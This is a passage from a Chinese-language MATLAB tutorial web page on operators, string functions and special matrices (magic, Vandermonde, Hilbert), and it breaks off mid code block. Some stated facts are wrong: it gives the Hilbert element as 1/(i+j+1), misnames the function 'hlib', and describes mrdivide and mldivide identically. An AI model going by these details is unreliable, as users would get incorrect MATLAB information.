align="center">A.^B：A的每个元素的B次幂（A、B为同纬度的矩阵）</td></tr><tr><td align="center"><strong>‘</strong></td><td align="center">矩阵的转置；A’是复数矩阵A的线性代数转置，这是复共轭转置。</td></tr><tr><td align="center"><strong>.’</strong></td><td align="center">数组的转置；A’是数组A的转置，对于复数矩阵，这不涉及共轭。</td></tr></tbody></table><h4 id="1-1-1-算术运算函数"><a href="#1-1-1-算术运算函数" class="headerlink" title="1.1.1 算术运算函数"></a>1.1.1 算术运算函数</h4><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>uplus(a)</code></td><td align="center">一元加号；增加量a</td></tr><tr><td align="center"><code>plus (a,b)</code></td><td align="center">相加；返回 a + b</td></tr><tr><td align="center"><code>uminus(a)</code></td><td align="center">一元减号；减少a</td></tr><tr><td align="center"><code>minus(a, b)</code></td><td align="center">相减；返回 a - b</td></tr><tr><td align="center"><code>times(a, b)</code></td><td align="center">数组相乘；返回 a.*b</td></tr><tr><td align="center"><code>mtimes(a, b)</code></td><td align="center">矩阵相乘；返回 a* b</td></tr><tr><td align="center"><code>rdivide(a, b)</code></td><td align="center">右阵划分；返回 a ./ b</td></tr><tr><td align="center"><code>ldivide(a, b)</code></td><td align="center">左阵划分；返回 a. b</td></tr><tr><td align="center"><code>mrdivide(A, B)</code></td><td align="center">求解线性方程组xA = B for x</td></tr><tr><td align="center"><code>mldivide(A, B)</code></td><td align="center">求解线性方程组xA = B for x</td></tr><tr><td align="center"><code>power(a, b)</code></td><td align="center">数组求幂；返回 a.^b</td></tr><tr><td align="center"><code>mpower(a, b)</code></td><td align="center">矩阵求幂；返回 a ^ b</td></tr><tr><td align="center"><code>cumprod(A)</code></td><td align="center">累积乘积；返回与包含累积乘积的数组A相同大小的数组。如果A是向量，则cumprod（A）返回一个包含A的元素的累积乘积的向量。如果A是矩阵，则cumprod（A）返回一个矩阵，其中包含A的每一列的累积乘积。如果A是一个多维数组，那么cumprod（A）将沿着第一个非正整数维。</td></tr><tr><td align="center"><code>cumprod(A, dim)</code></td><td align="center">沿维 <em>dim</em> 返回返回累积乘积。</td></tr><tr><td align="center"><code>cumsum(A)</code></td><td align="center">累加总和；返回包含累积和的数组A如果A是向量，则cumsum（A）返回一个包含A的元素的累积和的向量。如果A是矩阵，则cumsum（A）返回一个矩阵，其中包含A的每列的累积和。如果A是一个多维数组，那么cumsum（A）将沿着第一个非整数维度起作用。</td></tr><tr><td align="center"><code>cumsum(A, dim)</code></td><td align="center">返回沿着dim的元素的累积和。</td></tr><tr><td align="center"><code>diff(X)</code></td><td align="center">差分和近似导数；计算x相邻元素之间的差异。如果X是向量，则diff（X）返回相邻元素之间的差异的向量，比X短一个元素：[X（2）-X（1）X（3）-X（2）… X（N）-X（N-1）]如果X是一个矩阵，则diff（X）返回行差的矩阵：[X（2：m，…）-X（1：m-1，:)]</td></tr><tr><td align="center"><code>diff(X,n)</code></td><td align="center">递归应用n次，导致第n个差异。</td></tr><tr><td align="center"><code>diff(X,n,dim)</code></td><td align="center">它是沿标量dim指定的维数计算的第n个差分函数。 如果order n等于或超过Dim的长度，diff将返回一个空数组。</td></tr><tr><td align="center"><code>prod(A)</code></td><td align="center">数组元素的乘积；返回A数组元素的乘积。如果A是向量，则prod（A）返回元素的乘积。如果A是非空矩阵，则prod（A）将A的列作为向量，并返回每列乘积的行向量。如果A是一个空的0-by-0矩阵，则prod（A）返回1。如果A是一个多维数组，那么prod（A）将沿着第一个非子集维度行为并返回一个乘积数组。 该维数的尺寸减小到1，而所有其他维数的尺寸保持不变。如果输入A为单个，则prod函数计算并返回B为单个；对于所有其他数字和逻辑数据类型，prod函数计算并返回B为double。</td></tr><tr><td align="center"><code>prod(A,dim)</code></td><td align="center">沿dim维度返回乘积。 例如，如果A是矩阵，则prod（A，2）是包含每一行的乘积的列向量。</td></tr><tr><td align="center"><code>prod(__,datatype)</code></td><td align="center">在数据类型指定的类中乘以并返回一个数组。</td></tr><tr><td align="center"><code>sum(A)</code></td><td align="center">数组元素的总和；返回数组的不同维度的和。如果A是浮动的，那么是双倍或单个，B是本地累加的，它与A相同，B与A具有相同的类。如果A不是浮动的，则B被累加为双，B具有类double。如果A是向量，则sum（A）返回元素的总和。如果A是矩阵，则sum（A）将A的列作为向量，返回每列的和的行向量。如果A是一个多维数组，sum（A）将沿着第一个非单例维度的值作为向量来处理，返回一个行向量的数组。</td></tr><tr><td align="center"><code>sum(A,dim)</code></td><td align="center">沿标量A的维度求和。</td></tr><tr><td align="center"><code>sum(..., &#39;double&#39;)sum(..., dim,&#39;double&#39;)</code></td><td align="center">执行双精度加法，并返回double类型的答案，即使A具有数据类型单一或整型数据类型。这是整型数据类型的默认值。</td></tr><tr><td align="center"><code>sum(..., &#39;native&#39;)sum(..., dim,&#39;native&#39;)</code></td><td align="center">在本机数据类型A中执行添加，并返回相同数据类型的答案。 这是单和双的默认值。</td></tr><tr><td align="center"><code>ceil(A)</code></td><td align="center">向正无穷方向舍入；将a元素舍入为大于或等于A的最近整数。</td></tr><tr><td align="center"><code>fix(A)</code></td><td align="center">舍入为零</td></tr><tr><td align="center"><code>floor(A)</code></td><td align="center">向负无穷方向舍入；将a元素舍入为小于或等于a的最近整数。</td></tr><tr><td align="center"><code>idivide(a, b)idivide(a, b,&#39;fix&#39;)</code></td><td align="center">整数除法的舍入选项；与A./B相同，只是分数的商向零舍入到最接近的整数。</td></tr><tr><td align="center"><code>idivide(a, b, &#39;round&#39;)</code></td><td align="center">分数的商舍入到最近的整数。</td></tr><tr><td align="center"><code>idivide(A, B, &#39;floor&#39;)</code></td><td align="center">分数商向负无穷大舍入到最接近的整数。</td></tr><tr><td align="center"><code>idivide(A, B, &#39;ceil&#39;)</code></td><td align="center">分数商向无穷大舍入到最接近的整数。</td></tr><tr><td align="center"><code>mod (X,Y)</code></td><td align="center">除法后的模数；返回X - n.* Y，其中 n = floor（X./Y）。 如果Y不是整数，并且商X / Y在整数的舍入误差内，则n是整数。 输入X和Y必须是相同大小的真实数组或实数标量（提供Y〜= 0）。请注意：mod(X,0) 是 Xmod(X,X) 是 0对于 X ＝ Y 和 Y ＝ 0的 mod(X，Y)具有与Y相同的符号。</td></tr><tr><td align="center"><code>rem (X,Y)</code></td><td align="center">除法之后的余数；返回X - n.* Y，其中n = fix（X./Y）。 如果Y不是整数，并且商X / Y在整数的舍入误差内，则n是整数。 输入X和Y必须是相同大小的真实数组或实数标量（提供Y〜= 0）。请记住：rem(X,0) 是 NaNX〜= 0的rem（X，X）为0对于 X<del>=Y 和 Y</del>=0 的rem（X，Y）与X具有相同的符号。</td></tr><tr><td align="center"><code>round(X)</code></td><td align="center">舍入到最接近的整数; 将X的元素舍入到最接近的整数。 正数元素的小数部分为0.5，最大到最接近的正整数。 负数元素的小数部分为-0.5，向下舍入到最接近的负整数。</td></tr></tbody></table><h4 id="1-1-2-基本算术运算"><a href="#1-1-2-基本算术运算" class="headerlink" title="1.1.2 基本算术运算"></a>1.1.2 基本算术运算</h4><p>包括：加（+）、减（-）、乘（*）、右除（/）、左除（\）、乘方（^）。</p><blockquote><ol><li>加减运算</li></ol></blockquote><ul><li>若两个矩阵同型，则运算时两矩阵的对应元素相加减。若不同型，则会报错。</li><li>一个标量也可以和矩阵进行加减运算，这时把标量和矩阵的每一个元素进行加减运算。</li></ul><blockquote><ol start="2"><li>乘法运算</li></ol></blockquote><ul><li>矩阵A和B进行乘法运算，要求A的列数与B的行数相等，此时称A、B矩阵是可乘的，或称A和B两矩阵维数和大小相容。如果两者的维数或大小不相容，则会提示错误。</li></ul><p>一个矩阵的乘方运算可以表示成 <code>A^x</code>，要求 A 为方阵，x 为标量。如：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>;<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>];<br>a^<span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>除法运算</li></ol></blockquote><ul><li>如果A矩阵是非奇异方阵，则<code>B/A</code>等效于 <code>B*inv(A)</code>，<code>A\B</code>等效于<code>inv(a)*B</code>。其中<code>inv(A)</code>表示A的逆。</li></ul><p>对于矩阵来说，右除和左除表示两种不同的<code>除数矩阵</code>和<code>被除数矩阵</code>关系。即两个矩阵做运算时，右除和左除的结果不同；一个矩阵和一个数做运算时，结果相同；两个数做运算时，结果相同。</p><blockquote><ol start="4"><li>点运算</li></ol></blockquote><p>点运算符包括：<code>.*</code>、<code>./</code>、<code>.\</code>、<code>.^</code> 。<br>两矩阵进行点运算是指它们的对应元素进行相关运算，要求两矩阵同型。</p><h3 id="1-2-逻辑运算符"><a href="#1-2-逻辑运算符" class="headerlink" title="1.2 逻辑运算符"></a>1.2 逻辑运算符</h3><p>逻辑运算都是针对元素的操作，运算结果是特殊的逻辑数组；在逻辑分析时，逻辑（真）用1表示，逻辑假用0表示，逻辑运算中所有的非零元素作为1处理。</p><p>包括：<code>与(&amp;)</code>、<code>或(|)</code>、<code>非(~)</code>。</p><blockquote><ol><li>参与逻辑运算的是两个标量a和b。</li></ol></blockquote><p><code>a&amp;b</code>：a、b全为非零时，运算结果为1，否则为0。<br><code>a|b</code>：a、b中只要有一个非零时，运算结果为1。<br><code>~a</code>：当a为零时，运算结果为1；当a为非零时，运算结果为0。</p><ul><li>若参与逻辑运算的是两个同型矩阵，那么将对矩阵相同位置上的元素按标量规则逐个进行运算，最终运算结果是一个与原矩阵同型的矩阵，其元素由1或0组成。</li><li>若参与逻辑运算的一个是标量，一个是矩阵，那么将在标量与矩阵中的每个元素之间按标量规则逐个进行运算，最终运算结果是一个与原矩阵同型的矩阵，其元素由1或0组成。</li></ul><h3 id="1-3-关系运算符"><a href="#1-3-关系运算符" class="headerlink" title="1.3 关系运算符"></a>1.3 关系运算符</h3><p>包括：<code>小于(&lt;)</code>、<code>小于或等于(&lt;=)</code>、<code>大于(&gt;)</code>、<code>大于或等于(&gt;=)</code>、<code>等于(==)</code>、<code>不等于(~=)</code>。</p><ul><li>当参与比较的量是两个同型的矩阵时，比较是对两矩阵相同位置的元素按标量关系运算规则逐个进行，最终的关系运算的结果是一个与原矩阵同型的矩阵，元素由 0 或 1 组成。</li><li>当参与比较的一个是标量，而另外一个是矩阵时，则把标量与矩阵的每一个元素按标量关系运行运算规则逐个比较，最终的关系运算的结果是一个与原矩阵同型的矩阵，元素由 0 或 1 组成。</li></ul><h2 id="2-字符串"><a href="#2-字符串" class="headerlink" title="2.字符串"></a>2.字符串</h2><h3 id="2-1-字符串的访问"><a href="#2-1-字符串的访问" class="headerlink" title="2.1 字符串的访问"></a>2.1 字符串的访问</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">xm=<span class="hljs-string">&#x27;LoongOne&#x27;</span>;<br>xm(<span class="hljs-number">1</span>:<span class="hljs-number">3</span>)<br><br>Loo<br></code></pre></div></td></tr></table></figure><h3 id="2-2-字符串的表示"><a href="#2-2-字符串的表示" class="headerlink" title="2.2 字符串的表示"></a>2.2 字符串的表示</h3><p>字符串包含在单引号中，若字符串中的字符含有单引号，则该单引号字符要用两个单引号来表示。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">xm=<span class="hljs-string">&#x27;i&#x27;&#x27;m a student&#x27;</span><br><br>i&#x27;m a student<br></code></pre></div></td></tr></table></figure><h3 id="2-3-字符串矩阵"><a href="#2-3-字符串矩阵" class="headerlink" title="2.3 字符串矩阵"></a>2.3 字符串矩阵</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">ch=[<span class="hljs-string">&#x27;abcd&#x27;</span>;<span class="hljs-string">&#x27;1233&#x27;</span>];<br>ch(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br><br><span class="hljs-built_in">ans</span> =<br><span class="hljs-number">3</span><br></code></pre></div></td></tr></table></figure><h3 id="2-4-字符串执行"><a href="#2-4-字符串执行" class="headerlink" title="2.4 字符串执行"></a>2.4 字符串执行</h3><p><code>eval(S)</code> 将字符串中的内容作为 matlab 命令来执行。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">t=<span class="hljs-built_in">pi</span>;<br>m=<span class="hljs-string">&#x27;[t,sin(t),cos(t)]&#x27;</span>;<br>y=eval(m)<br><br>y =<br><span class="hljs-number">3.1416</span><span class="hljs-number">0.0000</span><span class="hljs-number">-1.0000</span><br></code></pre></div></td></tr></table></figure><h3 id="2-5-字符串与数值之间的转换"><a href="#2-5-字符串与数值之间的转换" class="headerlink" title="2.5 字符串与数值之间的转换"></a>2.5 字符串与数值之间的转换</h3><ul><li><code>abs</code>和<code>double</code>函数都可以用来获取字符串矩阵所对应的ASCII码数值矩阵。</li><li><code>char</code>函数可以把ASCII码矩阵转换为字符串矩阵。</li></ul><h3 id="2-6-字符串的比较"><a href="#2-6-字符串的比较" class="headerlink" title="2.6 字符串的比较"></a>2.6 字符串的比较</h3><p>有两种方法：利用关系运算符或字符串比较函数。</p><ul><li><p>关系运算符比较：两个字符串里的每个字符依次按ASCII值大小逐个进行比较，比较的结果是一个数值向量，向量中的元素要么是1，要么是0.</p></li><li><p>字符串比较函数<br>①<code>strcmp(s1,s2)</code>：用来比较字符串s1和s2是否相等，如果相等，返回结果为1，否则返回0。<br>②<code>strncmp(s1，s2，n)</code>：用来比较两个字符串前 n 个字符是否相等，如果相等，返回1，否则返回0。<br>③<code>strcmpi(s1,s2)</code>：在忽略字母大小写前提下，比较字符串s1和s2是否相等，如果相等，返回1，否则返回0。<br>④<code>strncmpi(s1，s2，n)</code>：在忽略字符串大小写前提下，比较两个字符串前 n 个字符是否相等，如果相等，返回1，否则返回0。</p></li></ul><h3 id="2-7-字符串的查找与替换"><a href="#2-7-字符串的查找与替换" class="headerlink" title="2.7 字符串的查找与替换"></a>2.7 字符串的查找与替换</h3><ul><li><code>findstr(s1，s2)</code>：返回短字符串在长字符串中的开始位置。两个串的位置任意。</li><li><code>strrep(s1，s2，s3)</code>：将字符串s1中的所有子字符串s2替换为字符串s3。</li></ul><h2 id="3-矩阵处理"><a href="#3-矩阵处理" class="headerlink" title="3.矩阵处理"></a>3.矩阵处理</h2><h3 id="3-1-特殊矩阵"><a href="#3-1-特殊矩阵" class="headerlink" title="3.1 特殊矩阵"></a>3.1 特殊矩阵</h3><p>分为通用性的特殊矩阵、用于专门学科的特殊矩阵。</p><h4 id="3-1-1-通用的特殊矩阵"><a href="#3-1-1-通用的特殊矩阵" class="headerlink" title="3.1.1 通用的特殊矩阵"></a>3.1.1 通用的特殊矩阵</h4><h5 id="3-1-1-1-zeros函数"><a href="#3-1-1-1-zeros函数" class="headerlink" title="3.1.1.1 zeros函数"></a>3.1.1.1 zeros函数</h5><p><code>zeros函数</code>：产生全 0 矩阵，即零矩阵。<br>调用格式：</p><blockquote><ol><li><code>zeros(m)</code>：产生 m * m 零矩阵。</li></ol></blockquote><blockquote><ol start="2"><li><code>zeros(m,n)</code>：产生 m * n 零矩阵。</li></ol></blockquote><blockquote><ol start="3"><li><code>zeros(size(A))</code>：产生与矩阵A同样大小的零矩阵，返回的是矩阵。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br><br><span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(<span class="hljs-built_in">reshape</span>(a,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>)))<br><span class="hljs-built_in">ans</span> = <br><span class="hljs-number">0</span><span class="hljs-number">0</span><br><span class="hljs-number">0</span><span class="hljs-number">0</span><br><span class="hljs-number">0</span><span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><h5 id="3-1-1-2-ones函数"><a href="#3-1-1-2-ones函数" class="headerlink" title="3.1.1.2 ones函数"></a>3.1.1.2 ones函数</h5><p><code>ones函数</code>：产生全 1 矩阵，即幺矩阵。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a = <span class="hljs-built_in">ones</span>(<span class="hljs-number">3</span>)<br>a =<br><span class="hljs-number">1</span><span class="hljs-number">1</span><span class="hljs-number">1</span><br><span class="hljs-number">1</span><span class="hljs-number">1</span><span class="hljs-number">1</span><br><span class="hljs-number">1</span><span class="hljs-number">1</span><span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h5 id="3-1-1-3-eye函数"><a href="#3-1-1-3-eye函数" class="headerlink" title="3.1.1.3 eye函数"></a>3.1.1.3 eye函数</h5><p><code>eye函数</code>：产生对角线为 1 的矩阵。当矩阵是方阵时，得到一个单位矩阵。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">eye</span>(<span class="hljs-number">4</span>)<br><br><span class="hljs-number">1</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span><br>    <span class="hljs-number">0</span>     <span class="hljs-number">1</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span><br>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">1</span>     <span class="hljs-number">0</span><br>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">0</span>     <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h5 id="3-1-1-4-rand函数"><a href="#3-1-1-4-rand函数" class="headerlink" title="3.1.1.4 rand函数"></a>3.1.1.4 rand函数</h5><p><code>rand函数</code>：产生（0，1）区间均匀分布的随机矩阵。<br><code>fix(a+(b-a+1)*x)</code>：产生 [a,b] 区间上均匀分布的随机整数。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a = <span class="hljs-built_in">rand</span>(<span class="hljs-number">4</span>)<br>a = <br>    <span class="hljs-number">0.3922</span>    <span class="hljs-number">0.0318</span>    <span class="hljs-number">0.8235</span>    <span class="hljs-number">0.0344</span><br>    <span class="hljs-number">0.6555</span>    <span class="hljs-number">0.2769</span>    <span class="hljs-number">0.6948</span>    <span class="hljs-number">0.4387</span><br>    <span class="hljs-number">0.1712</span>    <span class="hljs-number">0.0462</span>    <span class="hljs-number">0.3171</span>    <span class="hljs-number">0.3816</span><br>    <span class="hljs-number">0.7060</span>    <span class="hljs-number">0.0971</span>    <span class="hljs-number">0.9502</span>    <span class="hljs-number">0.7655</span><br></code></pre></div></td></tr></table></figure><p>[10,99]：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a=<span class="hljs-built_in">fix</span>(<span class="hljs-number">10</span>+(<span class="hljs-number">99</span>-a+<span class="hljs-number">1</span>)*<span class="hljs-built_in">rand</span>(<span class="hljs-number">4</span>))<br><br>    <span class="hljs-number">30</span>    <span class="hljs-number">72</span>    <span class="hljs-number">22</span>    <span class="hljs-number">32</span><br>    <span class="hljs-number">77</span>    <span class="hljs-number">90</span>    <span class="hljs-number">23</span>    <span class="hljs-number">83</span><br>    <span class="hljs-number">32</span>    <span class="hljs-number">96</span>    <span class="hljs-number">33</span>    <span class="hljs-number">31</span><br>    <span class="hljs-number">55</span>    <span class="hljs-number">59</span>    <span class="hljs-number">85</span>    <span class="hljs-number">93</span><br></code></pre></div></td></tr></table></figure><h5 id="3-1-1-5-randn函数"><a href="#3-1-1-5-randn函数" class="headerlink" title="3.1.1.5 randn函数"></a>3.1.1.5 randn函数</h5><p><code>randn函数</code>：产生均值为 0 ，方差为 1 的标准正态分布随机矩阵。<br>u + σx ：得到均值为 u 、方差为 σ<sup>2 </sup>的随机数。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a=<span class="hljs-built_in">randn</span>(<span class="hljs-number">5</span>)<br><br>   <span class="hljs-number">-0.8236</span>   <span class="hljs-number">-1.3337</span>   <span class="hljs-number">-0.2620</span>   <span class="hljs-number">-1.1564</span>   <span class="hljs-number">-0.0200</span><br>   <span class="hljs-number">-1.5771</span>    <span class="hljs-number">1.1275</span>   <span class="hljs-number">-1.7502</span>   <span class="hljs-number">-0.5336</span>   <span class="hljs-number">-0.0348</span><br>    <span class="hljs-number">0.5080</span>    <span class="hljs-number">0.3502</span>   <span class="hljs-number">-0.2857</span>   <span class="hljs-number">-2.0026</span>   <span class="hljs-number">-0.7982</span><br>    <span class="hljs-number">0.2820</span>   <span class="hljs-number">-0.2991</span>   <span class="hljs-number">-0.8314</span>    <span class="hljs-number">0.9642</span>    <span class="hljs-number">1.0187</span><br>    <span class="hljs-number">0.0335</span>    <span class="hljs-number">0.0229</span>   <span class="hljs-number">-0.9792</span>    <span class="hljs-number">0.5201</span>   <span class="hljs-number">-0.1332</span><br></code></pre></div></td></tr></table></figure><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a=<span class="hljs-number">3</span>+<span class="hljs-number">10</span>*<span class="hljs-built_in">randn</span>(<span class="hljs-number">5</span>)<br><br>   <span class="hljs-number">-4.1453</span>   <span class="hljs-number">-5.4793</span>   <span class="hljs-number">-9.5712</span>  <span class="hljs-number">-20.2987</span>    <span class="hljs-number">1.6972</span><br>   <span class="hljs-number">16.5139</span>   <span class="hljs-number">-8.2013</span>   <span class="hljs-number">-5.6547</span>  <span class="hljs-number">-11.4910</span>    <span class="hljs-number">4.8369</span><br>    <span class="hljs-number">0.7523</span>   <span class="hljs-number">28.2600</span>    <span class="hljs-number">1.2347</span>    <span class="hljs-number">6.3351</span>   <span class="hljs-number">-1.7615</span><br>   <span class="hljs-number">-2.8903</span>   <span class="hljs-number">19.5550</span>   <span class="hljs-number">10.9142</span>    <span class="hljs-number">6.9135</span>   <span class="hljs-number">11.6202</span><br>    <span class="hljs-number">0.0625</span>    <span class="hljs-number">6.0754</span>  <span class="hljs-number">-10.3200</span>    <span class="hljs-number">7.5168</span>  <span class="hljs-number">-10.6169</span><br></code></pre></div></td></tr></table></figure><h4 id="3-1-2-专门学科的特殊矩阵"><a href="#3-1-2-专门学科的特殊矩阵" class="headerlink" title="3.1.2 专门学科的特殊矩阵"></a>3.1.2 专门学科的特殊矩阵</h4><h5 id="3-1-2-1-魔方矩阵"><a href="#3-1-2-1-魔方矩阵" class="headerlink" title="3.1.2.1 魔方矩阵"></a>3.1.2.1 魔方矩阵</h5><ul><li><p>n 阶魔方阵由 1，2，3·····，n<sup>2</sup>共 n<sup>2</sup> 个整数组成，且每行、每列以及主、副对角线上各 n 个元素之和都相等。</p></li><li><p>n 阶魔方阵每行每列元素的和为 （1+2+3+···+n<sup>2</sup>）/ n = （n+n<sup>3</sup>）/2。</p></li></ul><p>如图：</p><p><code>magic函数</code>：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">m=<span class="hljs-built_in">magic</span>(<span class="hljs-number">5</span>)<br><br>    <span class="hljs-number">17</span>    <span class="hljs-number">24</span>     <span class="hljs-number">1</span>     <span class="hljs-number">8</span>    <span class="hljs-number">15</span><br>    <span class="hljs-number">23</span>     <span class="hljs-number">5</span>     <span class="hljs-number">7</span>    <span class="hljs-number">14</span>    <span class="hljs-number">16</span><br>     <span class="hljs-number">4</span>     <span class="hljs-number">6</span>    <span class="hljs-number">13</span>    <span class="hljs-number">20</span>    <span class="hljs-number">22</span><br>    <span class="hljs-number">10</span>    <span class="hljs-number">12</span>    <span class="hljs-number">19</span>    <span class="hljs-number">21</span>     <span class="hljs-number">3</span><br>    <span class="hljs-number">11</span>    <span class="hljs-number">18</span>    <span class="hljs-number">25</span>     <span class="hljs-number">2</span>     <span class="hljs-number">9</span><br></code></pre></div></td></tr></table></figure><h5 id="3-1-2-2-范德蒙矩阵"><a href="#3-1-2-2-范德蒙矩阵" class="headerlink" title="3.1.2.2 范德蒙矩阵"></a>3.1.2.2 范德蒙矩阵</h5><p><code>vander(v)函数</code> 生成以向量 v 为基础的范德蒙矩阵。</p><p>如图：</p><p><img src="https://img-blog.csdnimg.cn/20210617155436155.png"></p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; a=<span class="hljs-built_in">vander</span>(<span class="hljs-number">1</span>:<span class="hljs-number">3</span>)<br><br>a =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">4</span>     <span class="hljs-number">2</span>     <span class="hljs-number">1</span><br>     <span class="hljs-number">9</span>     <span class="hljs-number">3</span>     <span class="hljs-number">1</span><br><br>&gt;&gt; b=<span class="hljs-built_in">vander</span>(<span class="hljs-number">1</span>:<span class="hljs-number">5</span>)<br><br>b =<br><br>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span>     <span class="hljs-number">1</span><br>    <span class="hljs-number">16</span>     <span class="hljs-number">8</span>     <span class="hljs-number">4</span>     <span class="hljs-number">2</span>     <span class="hljs-number">1</span><br>    <span class="hljs-number">81</span>    <span class="hljs-number">27</span>     <span class="hljs-number">9</span>     <span class="hljs-number">3</span>     <span class="hljs-number">1</span><br>   <span class="hljs-number">256</span>    <span class="hljs-number">64</span>    <span class="hljs-number">16</span>     <span class="hljs-number">4</span>     <span class="hljs-number">1</span><br>   <span class="hljs-number">625</span>   <span class="hljs-number">125</span>    <span class="hljs-number">25</span>     <span class="hljs-number">5</span>     <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h5 id="3-1-2-3-希尔伯特矩阵"><a href="#3-1-2-3-希尔伯特矩阵" class="headerlink" title="3.1.2.3 希尔伯特矩阵"></a>3.1.2.3 希尔伯特矩阵</h5><p><code>hlib(n)函数</code></p><p>如图：</p><p><img src="https://img-blog.csdnimg.cn/20210617155454484.png"></p><p>由图可知：希尔伯特矩阵的元素为 H(i,j)=1/(i+j+1) 。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 